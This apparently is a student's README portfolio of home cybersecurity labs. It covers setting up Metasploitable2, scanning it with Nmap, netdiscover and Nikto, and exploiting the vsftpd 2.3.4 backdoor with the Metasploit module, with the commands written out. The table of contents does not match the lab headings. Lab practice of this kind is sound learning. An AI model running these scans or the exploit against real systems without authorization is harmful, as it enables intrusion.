# Cybersecurity Labs Portfolio 

Welcome to my hands-on cybersecurity lab portfolio!  
This is where I document everything I'm practicing — from virtual labs to tools like Nmap, Wireshark, Metasploit, and more.

- ## 📚 Table of Contents

- [🔥 Lab 1: Metasploitable2 Setup](#lab-1-metasploitable2-setup-vulnerable-machine-for-testing)
- [🧠 Lab 2: Nmap Scan on Metasploitable2](#lab-2-nmap-scan-on-metasploitable2)
- [🧪 Lab 3: Wireshark Packet Capture](#lab-3-wireshark-packet-capture)
- [🚨 Lab 4: Metasploit Exploit Demo](#lab-4-metasploit-exploit-demo)
- [🔐 What’s Next](#whats-next)


##  Lab 1: Metasploitable2 Setup (Vulnerable Machine for Testing)

Tool Used: VirtualBox  
System: Metasploitable2 (Ubuntu 2.6.24)  
Status:  Completed

###  What I Did:
- Imported the Metasploitable2 VM into VirtualBox
- Configured network settings (NAT and Host-only for Kali interaction)
- Logged in with default credentials: msfadmin/msfadmin
- Verified system status:
  ```bash
  ip a
  uname -a
  
##   Lab 2: Kali Linux Setup and Reconnaissance

Tool Used: Kali Linux (2025.2 VirtualBox Image)
Status: Completed

###  What I Did:
	•	Installed Kali Linux VM in VirtualBox
	•	Connected it to the same network as Metasploitable2
	•	Discovered Metasploitable2’s IP using:
 netdiscover
arp-scan -l
•	Performed a basic Nmap scan:
nmap -sS [target_IP]

##   Lab 3: Vulnerability Scanning with Nmap and Nikto

Tools Used: Nmap, Nikto
Status: Completed

###   What I Did:
	•	Conducted service/version detection:
 nmap -sV [target_IP]
 Ran Nikto for web vulnerability scanning:
 nikto -h http://[target_IP]
 
## Lab 4: Exploitation Using Metasploit

Tool Used: Metasploit Framework
Status: Completed

###  What I Did:
	•	Launched Metasploit:
 msfconsole
 •	Searched for open vulnerabilities on the target
	•	Exploited vsftpd 2.3.4 backdoor:
 use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST [target_IP]
exploit
I’ll continue adding more labs here as I learn tools like Hydra (for brute-force), Wireshark (for packet analysis), and Snort (for intrusion detection).

Stay tuned! 
 
 
